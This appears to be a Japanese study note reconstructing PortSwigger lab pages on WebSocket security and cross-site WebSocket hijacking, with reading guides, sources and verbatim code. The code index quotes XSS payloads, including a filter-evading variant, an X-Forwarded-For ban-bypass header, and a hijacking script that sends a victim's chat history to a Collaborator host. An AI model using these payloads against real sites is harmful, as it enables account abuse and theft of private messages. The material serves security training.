> 本セッションでは組織の egress ポリシーにより **portswigger.net へ直接アクセスできなかった**（CONNECT 403 / WebFetch は EGRESS_BLOCKED）。web.archive.org・Google キャッシュも同様に遮断、WebSearch も予算枯渇。本文・コードは GitHub 上の逐語ミラー（raw.githubusercontent.com）を複数照合して完全再構成したが、図（websockets.svg）、最新の UI スクリーンショット、ラボ環境そのものは取得できていない。読者は各自ブラウザで原典を開いて次を確認・体験してほしい。

- **/web-security/websockets（トピックトップ）の読みどころ**
  1. 「Manipulating WebSocket traffic」の 3 手順（Intercept/Replay/Manipulate connections）を Burp の実 UI と対応づけて読む。
  2. XSS PoC 例（`{"message":"<img src=1 onerror='alert(1)'>"}`）が「メッセージ改ざん→他者ブラウザで描画」という経路である点。
  3. 「How to secure a WebSocket connection」の 4 指針（wss、URL ハードコード、CSRF 保護、双方向 untrusted 扱い）。
- **/web-security/websockets/what-are-websockets の読みどころ**
  1. ハンドシェイク request/response の実バイト列（`Upgrade: websocket` / `Connection: keep-alive, Upgrade` / `Sec-WebSocket-Version: 13` / `Sec-WebSocket-Key` / `101 Switching Protocols` / `Sec-WebSocket-Accept`）。
  2. `Sec-WebSocket-Accept` が `Sec-WebSocket-Key` ＋仕様固定文字列のハッシュである点（キャッシュ／誤設定対策）。
  3. `ws://` と `wss://` の違い、JSON メッセージ形式の例。
- **/web-security/websockets/cross-site-websocket-hijacking の読みどころ**
  1. 「CSWSH ＝ ハンドシェイクに対する CSRF」で、Cookie のみのセッション管理＋予測不能値なしが成立条件、という核心定義。
  2. 通常 CSRF との差＝**双方向（送信＋受信＝機密データ窃取）**である点。
  3. 影響の 2 類型（なりすまし操作／機密データ取得）と、攻撃第一歩＝ハンドシェイクの CSRF 保護有無の精査。
- **ラボ（要ログイン・要 Burp）**: 上表 3 ラボを実際に解いて、Burp Proxy の WebSockets history、Repeater のハンドシェイク編集ウィザード（鉛筆アイコン）、exploit サーバ＋Collaborator を使う CSWSH の一連の流れを体験する。
- **関連（原典から辿れる横リンク）**: CSRF（/web-security/csrf#how-does-csrf-work）、OAST（/blog/oast-out-of-band-application-security-testing）、Burp の WebSocket interception rules 設定ドキュメント。ラボ②の Hint が案内する XSS ラボ（/web-security/cross-site-scripting）、ラボ③の Note が案内する Burp Collaborator ドキュメント（/burp/documentation/desktop/tools/collaborator）。
- **プロトコル一次規格・API リファレンス（本セッションでは egress 遮断により未取得。読者が各自参照。捏造回避のため内容は引用していない）**:
  1. **RFC 6455 “The WebSocket Protocol”**（https://www.rfc-editor.org/rfc/rfc6455 ／ https://datatracker.ietf.org/doc/html/rfc6455）— 読みどころ: `Sec-WebSocket-Accept` の算出（`Sec-WebSocket-Key` ＋ 固定 GUID `258EAFA5-E914-47DA-95CA-C5AB0DC85B11` を連結し SHA-1→Base64。§1.3, §4.2.2）、フレーム構造とオペコード（§5.2）、**クライアント→サーバのマスキング必須要件**（§5.3。プロキシキャッシュ汚染対策）、`Origin` の扱い（§4.1, §10.2。ブラウザ以外のクライアントは `Origin` 検証を回避し得る＝CSWSH 防御で `Origin` 単独に頼れない根拠）。PortSwigger 本文が「仕様で定義された特定の文字列」とだけ書く箇所の正体を確認するために読む。
  2. **MDN WebSocket API**（https://developer.mozilla.org/en-US/docs/Web/API/WebSocket）— 読みどころ: `WebSocket` コンストラクタ、`onopen`/`onmessage`/`onclose`/`onerror` イベント（CSWSH PoC の `ws.onopen`/`ws.onmessage` の意味）、`send()`、`readyState`。ラボ③テンプレートの各行が何をしているか実装レベルで理解するために読む。
  3. **OWASP: Testing WebSockets**（WSTG-CLNT-10 等）— 読みどころ: WebSocket の体系的テスト観点（Origin 検証、認証・認可、入力検証、TLS）。PortSwigger の攻撃者視点を、防御・監査のチェックリスト観点で補完するために読む。

---

## 逐語コード／ヘッダ値インデックス（原文まま。改変・省略なし）

- JS 接続生成: `var ws = new WebSocket("wss://normal-website.com/chat");`
- JS 送信: `ws.send("Peter Wiener");`
- JSON メッセージ例: `{"user":"Hal Pline","content":"I wanted to be a Playstation growing up, not a device to answer your inane questions"}`
- チャット送信例: `{"message":"Hello Carlos"}`
- 描画結果: `<td>Hello Carlos</td>`
- XSS PoC メッセージ: `{"message":"<img src=1 onerror='alert(1)'>"}`
- ハンドシェイク request（逐語）:
```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
- ハンドシェイク response（逐語）:
```http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
- ハンドシェイク関連ヘッダ: `Connection`, `Upgrade`, `Sec-WebSocket-Version`(=`13`), `Sec-WebSocket-Key`(Base64 ランダム), `Sec-WebSocket-Accept`(Key ＋仕様文字列のハッシュ)
- ハンドシェイク改変で信頼されがちな HTTP ヘッダ例: `X-Forwarded-For`
- ラボ②の IP BAN 回避用ハンドシェイクヘッダ（逐語）: `X-Forwarded-For: 1.1.1.1`
- ラボ②の難読化 XSS ペイロード（逐語。フィルタ回避用の大文字小文字混在＋バッククォート）: `` <img src=1 oNeRrOr=alert`1`> ``
- ラボ③ CSWSH のトリガーメッセージ（逐語）: `READY`（送信するとサーバが過去のチャット履歴を返す）
- ラボ③ 公式 exploit テンプレート（逐語。プレースホルダ `your-websocket-url` / `your-collaborator-url`）:
```html
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
- ラボ③で観測される実ハンドシェイク（sh3bu ミラーの実キャプチャ例。`Origin` と `Sec-Fetch-*` の存在が確認できる。値はラボ固有）:
```http
GET /chat HTTP/1.1
Host: 0a5a...web-security-academy.net
Sec-WebSocket-Version: 13
Origin: https://0a5a...web-security-academy.net
Sec-WebSocket-Key: rHRYnTnQlSN0/MayNfD9gQ==
Connection: keep-alive, Upgrade
Cookie: session=tcnP10xowGofDir0BMeIf0fn8ll8JpEW
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: websocket
Sec-Fetch-Site: same-origin
Upgrade: websocket
```
- ラボ①の重要実装詳細: クライアントは送信前に `<` を HTML エンコードする（が、Burp 傍受・改変で回避可能）
- CSWSH PoC（ラボ解法代表例。出典明記の上で参考掲載）:
```html
<script>
    var ws = new WebSocket('wss://your-lab-id.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-id.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

## 出典・ミラー来歴（監査用）

- 原典（遮断・逐語ミラーで再構成）:
  - https://portswigger.net/web-security/websockets
  - https://portswigger.net/web-security/websockets/what-are-websockets
  - https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
- 使用ミラー（raw.githubusercontent.com 経由で取得、相互照合済み）:
  - apuromafo/Academia_Backup … Portswigger/portswigger_academy_content_md/websockets/websockets.md（トップ本文）
  - musclebigger/cyber-security-knowledge-engine … data/portswigger-academy/web-security__websockets.md, __what-are-websockets.md, __cross-site-websocket-hijacking.md（原典 3 ページ、抓取 2026-09-05）
  - qub1tt/Multi-agent-Autonomous-Pentesting-Framework … Pentest_Corpus/PortSwigger/websockets.md（照合）
  - Diekgbbtt/polyphemus … tools/hunting/portswigger-scrape/websockets-full.md（トップ＋what-are-websockets のフルダンプ、照合）
  - sh3bu/Portswigger_labs … WebSockets/Cross-site WebSocket hijacking/README.md（CSWSH ラボ解法 PoC・実ハンドシェイクキャプチャの出典）
- **本補完（2026-09-18）で新規取得したミラー**（raw.githubusercontent.com、musclebigger/cyber-security-knowledge-engine、抓取 2026-09-05）:
  - data/portswigger-academy/web-security__websockets__lab-manipulating-messages-to-exploit-vulnerabilities.md（ラボ①説明＋公式 Solution）
  - data/portswigger-academy/web-security__websockets__lab-manipulating-handshake-to-exploit-vulnerabilities.md（ラボ②説明＋Hint＋公式 Solution）
  - data/portswigger-academy/web-security__websockets__cross-site-websocket-hijacking__lab.md（ラボ③説明＋Note＋公式 Solution 12 手順）
  - 検証: 本補完で musclebigger ミラーの原典 3 ページを再取得し、既存ノートの逐語再現と完全一致を再確認。CSWSH ラボ本文は sh3bu/Portswigger_labs と相互照合。apuromafo ミラーにはラボページ無し（404）。
- 到達不能だった代替手段（本補完で試行）: portswigger.net（WebFetch=EGRESS_BLOCKED / curl=000）、web.archive.org（proxy 403）、r.jina.ai・archive.org・gist.githubusercontent.com・medium.com 等（proxy 403）、WebSearch（予算 200/200 枯渇）。
